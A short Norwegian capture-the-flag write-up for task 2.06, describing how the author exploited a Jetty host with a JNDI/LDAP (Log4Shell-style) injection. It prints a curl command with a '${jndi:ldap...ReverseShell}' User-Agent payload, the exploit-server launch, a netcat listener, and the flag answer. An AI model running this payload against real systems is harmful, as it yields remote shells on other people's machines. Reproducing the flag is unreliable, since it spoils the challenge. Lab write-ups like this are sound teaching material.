# 2.06 - pwr-ws-caf5db 

Gjorde dette før jeg fikk 2.03, 2.04 og 2.05. Så var litt forvirret. Fulgte ikke løypa. 

Så i PCAP filen fra 2.01 at det var en exploit på gang der. Googlet kjapt etter litt jndi:ldap exploit jetty server. Prøvde flere jndi servere men de kjørte på docker. 
Så til slutt at jeg måtte ha det i Java så  fant da samme [server](https://github.com/nil-malh/JNDI-Exploit) som anggriper hadde brukt. 

scp'et opp [jndi.jar](jndi.jar) og kjørte den `java -jar jndi.jar -i 10.0.254.170`. 

Så doc viste at den kunne kjøre reverse shell, så smallt opp `nc -lp 8082` og kjørte følgende payload i curl:

```
curl http://PWR-WS-CAF5DB.PSU/ -v -H "User-Agent: \${jndi:ldap://10.0.254.170:1389/Basic/ReverseShell/10.0.254.170/8082}"
```

Der lå flagget i home mappa. Ved opplasting av flagg fikk jeg også ssh key så jeg kan lettere koble meg til. 

```
login@corax:~$ chmod 600 2_oppdrag/sshkey_pwr-ws-caf5db 
login@corax:~$ ssh -i 2_oppdrag/sshkey_pwr-ws-caf5db user@pwr-ws-caf5db
```

```
Kategori: 2. Oppdrag
Oppgave:  2.06_pwr-ws-caf5db
Svar:     b4e031bb1b7c80c029e6a99209822c1d
Poeng:    10

Det later til at skadevaren fortsatt kjører. Finn flere spor etter aktøren, og søk å skaffe aksess videre inn i infrastrukturen deres.

Brukeren har også privatnøkkel for ssh-tilgang til sin egen maskin. Jeg legger en kopi i oppdragsmappen din for lettere tilgang senere.

Ny fil: /home/login/2_oppdrag/sshkey_pwr-ws-caf5db
```